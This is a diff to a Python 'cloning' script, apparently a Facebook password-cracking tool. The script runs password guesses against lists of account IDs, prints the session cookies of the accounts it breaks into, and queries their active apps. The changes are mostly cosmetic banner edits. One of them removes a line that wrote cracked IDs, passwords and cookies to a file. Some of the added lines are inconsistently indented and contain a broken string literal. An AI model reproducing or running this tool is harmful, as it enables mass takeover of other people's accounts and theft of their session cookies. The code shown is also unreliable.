@@ -56,7 +56,7 @@ except ModuleNotFoundError:
 
 #------------------[ GLOBAL VARIABLES ]-------------------#
 
-version='OPEN SOURCE'
+version='0.1'
 file_name=[]
 ugen2=[]
 logincookie=[]
@@ -553,7 +553,7 @@ def contact():
 
 def groups():
 	linex()
-	print("OPEN SOURCE VERSION")
+	print("NO GROUPS")
 
 #-------------------[ CRACK-PUBLIK ]----------------#
 
@@ -682,6 +682,7 @@ def setting():
 	linex()
 	method.append('mobile')
 	global cekap,askc,scp
+	cekap +=input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m SHOW APP : ')
 	askc += input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m SHOW COOKIES : ')
 	scp += input(' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m SHOW CHECKPOINT : ')
 	passwrd()
@@ -693,8 +694,11 @@ def passwrd():
 	os.system('clear')
 	banner()
 	info()
-	print(f' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m TOTAL SCANNABLE IDS    :',str(len(id)))
-	print(" \x1b[37m\x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37m YOU STARTED CLONING AT : "+time.strftime("%H:%M")+" "+ tag)
+	print(f' \x1b[38;5;196m[\x1b[37m•\x1b[38;5;196m]\x1b[37mUSER NAME\033[1;91m :\033[1;96m "+uname)
+    print("\033[97;1m[\033[92;1m•\033[97;1m] \033[10;93m TODAY'S DATE :\033[1;92m "+date)
+    print('\033[97;1m[\033[92;1m+\033[97;1m] \033[1;92mYOUR TOTAL IDz \033[0;97m:\033[1;92m ',str(len(id)))
+    print("\033[97;1m[\033[92;1m•\033[97;1m] \x1b[38;5;208mSTARTED YOUR CLONING TIME\033[0;97m :> \033[1;92m"+time.strftime("%H:%M")+" "+ tag)
+    print(f'\033[97;1m[\033[92;1m•\033[97;1m] \033[1;92mUSE FLIGHT MODE FOR SPEED UP ')
 	linex()
 	print(f' \x1b[38;5;196m>>\x1b[37m USE FLIGHT MODE EVERY 500 IDS ')
 	linex()
@@ -808,9 +812,8 @@ def crack(idf,pwv):
                 coki=po.cookies.get_dict()
                 kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
                 print(f'\r{P}{H} [{time.strftime("%H:%M")}-OK] {idf} │ {pw} {P}')
-                print(f'\033[1;93m   [🇳🇵] COOKIE (1) \033[1;92m : '+kuki)
+                print(f'\033[1;93m [🇳🇵] COOKIE  \033[1;92m : '+kuki)
                 #os.system#@('espeak -a 300 " MANAS,  Ok,  id"')
-                open('/sdcard/MANAS/MANAS-OK.txt/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
                 cek_apk(session,coki)
                 break
                 
@@ -822,7 +825,7 @@ def crack(idf,pwv):
  
 
 #------------------[ METHODE-MBASIC-2 ]-------------------#
-	
+
 def cek_apk(session,coki):
     w=session.get("https://m.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
     sop = BeautifulSoup(w,"html.parser")
